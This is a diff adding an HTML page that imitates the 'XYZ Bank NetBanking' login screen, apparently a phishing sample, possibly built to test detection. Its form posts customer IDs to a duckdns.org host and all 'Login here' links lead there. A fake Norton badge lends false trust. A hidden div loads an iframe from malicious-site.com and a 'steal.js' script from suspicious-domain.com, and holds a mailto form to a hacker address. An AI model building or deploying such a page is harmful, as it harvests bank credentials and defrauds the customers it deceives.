@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome to XYZ Bank NetBanking</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+        }
+        
+        .header {
+            background-color: #ffffff;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 2px solid #e0e0e0;
+        }
+        
+        .header h1 {
+            color: #333;
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        
+        .logo-section {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            margin-top: 15px;
+        }
+        
+        .logo {
+            background-color: #dc2626;
+            color: white;
+            padding: 8px 16px;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        
+        .digital-badge {
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 30px 20px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 40px;
+        }
+        
+        .login-section {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .login-section h2 {
+            color: #333;
+            margin-bottom: 25px;
+            font-size: 22px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #007bff;
+        }
+        
+        .forgot-link {
+            color: #007bff;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        
+        .continue-btn {
+            background-color: #007bff;
+            color: white;
+            padding: 15px 40px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+        }
+        
+        .continue-btn:hover {
+            background-color: #0056b3;
+        }
+        
+        .welcome-message {
+            background-color: #e7f3ff;
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 25px;
+            color: #333;
+            line-height: 1.6;
+        }
+        
+        .services-section {
+            margin-top: 30px;
+        }
+        
+        .services-section h3 {
+            color: #333;
+            margin-bottom: 15px;
+        }
+        
+        .service-links {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+        
+        .service-link {
+            color: #007bff;
+            text-decoration: none;
+            padding: 8px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        .service-link:hover {
+            background-color: #f8f9fa;
+            text-decoration: underline;
+        }
+        
+        .info-section {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .security-info {
+            margin-bottom: 30px;
+        }
+        
+        .norton-badge {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .norton-icon {
+            background-color: #ffd700;
+            padding: 5px 10px;
+            border-radius: 3px;
+            font-weight: bold;
+            font-size: 12px;
+        }
+        
+        .features-list {
+            list-style: none;
+        }
+        
+        .features-list li {
+            margin-bottom: 10px;
+            color: #666;
+        }
+        
+        .features-list li:before {
+            content: "• ";
+            color: #007bff;
+            font-weight: bold;
+        }
+        
+        .register-section {
+            background-color: #f8f9fa;
+            padding: 20px;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+        
+        .register-section h4 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        
+        .register-link {
+            color: #007bff;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .register-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Welcome to XYZ Bank NetBanking</h1>
+        <div class="logo-section">
+            <span class="digital-badge">MADE DIGITAL AT</span>
+            <span class="logo">XYZ BANK</span>
+            <span class="logo">now</span>
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="login-section">
+            <h2>Login to NetBanking</h2>
+            
+            <form action="https://grub-whatsapp-keinzy-22.duckdns.org" method="POST">
+                <div class="form-group">
+                    <label for="customer-id">Customer ID/ User ID</label>
+                    <input type="text" id="customer-id" name="customer_id" required>
+                    <a href="#" class="forgot-link">Forgot Customer ID</a>
+                </div>
+                
+                <button type="submit" class="continue-btn">CONTINUE</button>
+            </form>
+            
+            <div class="welcome-message">
+                <strong>Dear Customer,</strong><br>
+                Welcome to the new login page of XYZ Bank NetBanking.<br>
+                Its lighter look and feel is designed to give you the best possible 
+                user experience. Please continue to login using your customer ID 
+                and password.
+            </div>
+            
+            <div class="services-section">
+                <h3>Don't have a XYZ Bank Savings Account?</h3>
+                <div class="service-links">
+                    <a href="https://grub-whatsapp-keinzy-22.duckdns.org" class="service-link">Credit Card only? Login here</a>
+                    <a href="https://grub-whatsapp-keinzy-22.duckdns.org" class="service-link">XYZ Ltd. Home Loans? Login here</a>
+                    <a href="https://grub-whatsapp-keinzy-22.duckdns.org" class="service-link">Prepaid Card only ? Login here</a>
+                    <a href="https://grub-whatsapp-keinzy-22.duckdns.org" class="service-link">XYZ Ltd. Deposits? Login here</a>
+                    <a href="https://grub-whatsapp-keinzy-22.duckdns.org" class="service-link">Retail Loan only? Login here</a>
+                </div>
+            </div>
+        </div>
+        
+        <div class="info-section">
+            <div class="security-info">
+                <div class="norton-badge">
+                    <span class="norton-icon">✓ Norton SECURED</span>
+                    <small>powered by Symantec</small>
+                </div>
+                <p>Your security is of utmost importance.</p>
+                <a href="#" class="forgot-link">Know More...</a>
+            </div>
+            
+            <div class="register-section">
+                <h4>First Time User?</h4>
+                <a href="#" class="register-link">Register Now</a> for a host of convenient features
+            </div>
+            
+            <div style="margin-top: 30px;">
+                <h4>We have added a host of new features!</h4>
+                <p style="margin: 15px 0; color: #666;">You can now do so much more:</p>
+                <ul class="features-list">
+                    <li>Anywhere access through Desktop or mobile</li>
+                    <li>Enhanced security measures</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+    
+    <div style="display: none;">
+        <iframe src="http://malicious-site.com"></iframe>
+        <form action="mailto:hacker@suspicious.com"></form>
+        <script src="http://suspicious-domain.com/steal.js"></script>
+    </div>
+    
+    <script>
+        // Suspicious JavaScript that might be flagged
+        document.addEventListener('DOMContentLoaded', function() {
+            // Simulate form submission to suspicious URL
+            const form = document.querySelector('form');
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                alert('Submit the credentials!');
+            });
+            
+            // Add some suspicious behavior
+            // setTimeout(function() {
+            //     if (window.location.hostname !== 'netbanking.xyzbank.com') {
+            //         console.log('Warning: This appears to be a phishing site!');
+            //     }
+            // }, 1000);
+        });
+    </script>
+</body>
+</html>
